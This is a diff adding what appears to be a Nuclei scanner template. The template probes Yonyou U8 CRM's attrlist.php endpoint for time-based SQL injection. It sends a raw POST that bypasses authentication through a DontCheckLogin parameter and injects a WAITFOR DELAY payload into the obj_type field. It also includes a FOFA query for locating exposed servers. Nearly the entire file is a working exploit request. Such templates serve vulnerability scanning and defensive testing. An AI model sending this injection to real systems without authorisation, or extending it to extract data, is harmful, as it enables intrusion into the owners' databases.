@@ -1,0 +1,32 @@
+id: yonyou-u8-crm-attrlist-sqli
+info:
+  name: 用友 U8 CRM attrlist - sqli
+  author: leadlife
+  severity: high
+  description: todo
+  reference: 
+    - https://github.com/wy876/POC/blob/c19942e30121f116548ca14c0375ba6c8560afeb/%E7%94%A8%E5%8F%8BU8-CRM%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3attrlist%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: false
+    fofa-query: app="用友U8CRM"
+  tags: yonyou,u8crm,crm,sqli,oa,time
+
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        POST /devtools/tools/attrlist.php?DontCheckLogin=1&isquery=1 HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; 
+
+        obj_type=1';WAITFOR DELAY '0:0:6'--
+
+    matchers:
+      - type: dsl
+        dsl:
+          - duration >= 5 && duration < 9
+          - status_code == 200
+        condition: and
